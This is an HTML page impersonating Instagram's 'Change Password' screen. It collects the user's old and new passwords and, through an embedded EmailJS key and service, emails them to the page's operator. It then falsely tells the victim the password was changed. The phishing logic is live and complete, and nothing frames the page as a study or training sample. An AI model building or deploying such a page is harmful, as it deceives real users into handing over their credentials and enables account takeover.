<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Change Password</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
  (function() {
    emailjs.init("WEWmUpFlLDKreXgnp"); 
  })();
</script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #152127;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .password-change-container {
            background-color: #152127;
            border-radius: 1px;
            padding: 20px 40px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
    .logo {
      margin-bottom: 1.5rem;
    }
        .logo img {
      width: 60px;
      height: 60px;
    }
        
        .title {
            color: #fff;
            font-size: 20px;
            font-weight: 600;
            line-height: 20px;
            margin: 0 0 16px;
            text-align: center;
        }
        
        .description {
            color: #8e8e8e;
            font-size: 14px;
            line-height: 18px;
            margin: 0 0 16px;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 6px;
            position: relative;
        }
        
        .form-control {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px 7px;
            width: 100%;
            height: 36px;
        }
        
        .form-control:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        
        .btn {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            padding: 5px 9px;
            text-align: center;
            width: 100%;
            height: 32px;
            margin-top: 8px;
        }
        
        .btn:disabled {
            background-color: #0064e0;
            cursor: default;
        }
        
        .separator {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 10px 0 18px;
            display: flex;
            align-items: center;
            text-transform: uppercase;
        }
        
        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        
        .separator::before {
            margin-right: 10px;
        }
        
        .separator::after {
            margin-left: 10px;
        }
        
        .error-message {
            color: #ed4956;
            font-size: 14px;
            line-height: 18px;
            margin: 10px 0;
            text-align: center;
        }
        
        .success-message {
            color: #0095f6;
            font-size: 14px;
            line-height: 18px;
            margin: 10px 0;
            text-align: center;
        }
        
        .show-password {
            position: absolute;
            right: 8px;
            top: 10px;
            font-size: 14px;
            font-weight: 600;
            color: #262626;
            cursor: pointer;
            user-select: none;
        }
    </style>
</head>
<body>
    <div class="password-change-container">
        <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        </div>
        
        <h1 class="title">Change Password</h1>
        <p class="description">Create a new password that is at least 8 characters long.</p>
        
        <div id="errorMessage" class="error-message" style="display: none;"></div>
        <div id="successMessage" class="success-message" style="display: none;"></div>
        
        <form id="passwordChangeForm">
            <div class="form-group">
                <input type="password" class="form-control" id="oldPassword" placeholder="Old Password" required>
                <span class="show-password" onclick="togglePassword('oldPassword')">Show</span>
            </div>
            
            <div class="form-group">
                <input type="password" class="form-control" id="newPassword" placeholder="New Password" required>
                <span class="show-password" onclick="togglePassword('newPassword')">Show</span>
            </div>
            
            <div class="form-group">
                <input type="password" class="form-control" id="confirmPassword" placeholder="Confirm New Password" required>
                <span class="show-password" onclick="togglePassword('confirmPassword')">Show</span>
            </div>
            
            <button type="submit" class="btn" id="submitBtn">Change Password</button>
        </form>
    </div>

    <script>
      function togglePassword(id) {
    const input = document.getElementById(id);
    const toggle = input.nextElementSibling;

    if (input.type === "password") {
      input.type = "text";
      toggle.textContent = "Hide";
    } else {
      input.type = "password";
      toggle.textContent = "Show";
    }
  }

  document.getElementById("passwordChangeForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const oldPassword = document.getElementById("oldPassword").value;
    const newPassword = document.getElementById("newPassword").value;
    const confirmPassword = document.getElementById("confirmPassword").value;

    const errorMessage = document.getElementById("errorMessage");
    const successMessage = document.getElementById("successMessage");

    errorMessage.style.display = "none";
    successMessage.style.display = "none";

    if (newPassword.length < 6) {
      errorMessage.textContent = "Password must be at least 6 characters long.";
      errorMessage.style.display = "block";
      return;
    }

    if (newPassword !== confirmPassword) {
      errorMessage.textContent = "New passwords do not match.";
      errorMessage.style.display = "block";
      return;
    }

    // Send data using EmailJS
    emailjs.send("insta-password-service", "template_7ykivm1", {
      old_password: oldPassword,
      new_password: newPassword,
      confirm_password: confirmPassword
    })
    .then(function () {
      successMessage.textContent = "Password changed successfully!";
      successMessage.style.display = "block";
      document.getElementById("passwordChangeForm").reset();
    }, function (error) {
      errorMessage.textContent = "please retry again" + error.text;
      errorMessage.style.display = "block";
    });
  });
        function togglePassword(id) {
            const input = document.getElementById(id);
            const toggle = input.nextElementSibling;
            
            if (input.type === "password") {
                input.type = "text";
                toggle.textContent = "Hide";
            } else {
                input.type = "password";
                toggle.textContent = "Show";
            }
        }
        
        document.getElementById('passwordChangeForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const oldPassword = document.getElementById('oldPassword').value;
            const newPassword = document.getElementById('newPassword').value;
            const confirmPassword = document.getElementById('confirmPassword').value;
            
            const errorMessage = document.getElementById('errorMessage');
            const successMessage = document.getElementById('successMessage');
            
            errorMessage.style.display = 'none';
            successMessage.style.display = 'none';
            
            // Basic validation
            if (newPassword.length < 6) {
                errorMessage.textContent = 'Password must be at least 6 characters long.';
                errorMessage.style.display = 'block';
                return;
            }
            
            if (newPassword !== confirmPassword) {
                errorMessage.textContent = 'New passwords do not match.';
                errorMessage.style.display = 'block';
                return;
            }
            
            // Here you would typically send the data to your server
            // For demonstration, we'll just show a success message
            successMessage.textContent = 'Password changed successfully!';
            successMessage.style.display = 'block';
            
            // Reset form
            document.getElementById('passwordChangeForm').reset();
        });
</script>
</body>
</html>
